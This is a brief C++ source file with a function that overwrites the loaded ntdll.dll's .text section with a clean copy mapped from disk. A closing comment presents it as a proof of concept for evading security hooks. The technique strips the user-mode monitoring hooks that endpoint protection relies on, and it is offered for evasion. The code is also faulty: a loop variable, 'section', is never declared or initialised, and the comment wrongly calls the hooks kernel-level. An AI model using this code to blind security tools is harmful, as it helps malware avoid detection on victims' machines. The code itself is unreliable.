#include <windows.h>
#include <winnt.h>
#include <iostream>

bool UnhookNtdll(){
    const wchar_t* ntdll_Path = L"C:\\Windows\\System32\\ntdll.dll";
    
    HANDLE hFile = CreateFileW(ntdll_Path, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE){
        return false;
    }

    HANDLE hMapping = CreateFileMappingW(hFile, nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, 0);
    if(!hMapping){
        CloseHandle(hFile);
        return false;
    }

    LPVOID cleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!cleanNtdll){
        CloseHandle(hFile);
        CloseHandle(hMapping);
        return false;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)cleanNtdll + dosHeader->e_lfanew);

    LPVOID ntdllBase = GetModuleHandleW(L"ntdll.dll");

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++){
        if(memcmp(section->Name, ".text", 5) == 0) {
            DWORD oldProtect;
            LPVOID pDest = (LPBYTE)ntdllBase + section->VirtualAddress;
            LPVOID pSrc = (LPBYTE)cleanNtdll + section->VirtualAddress;
         
            
            if (VirtualProtect(pDest, section->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                memcpy(pDest, pSrc, section->Misc.VirtualSize);

                VirtualProtect(pDest, section->Misc.VirtualSize, oldProtect, &oldProtect);
            }
            break;
        }
    }

    UnmapViewOfFile(cleanNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    return true;
}

//Prove of Concept How to unhook the ntdll for evasion hooks of the kernelLand :D
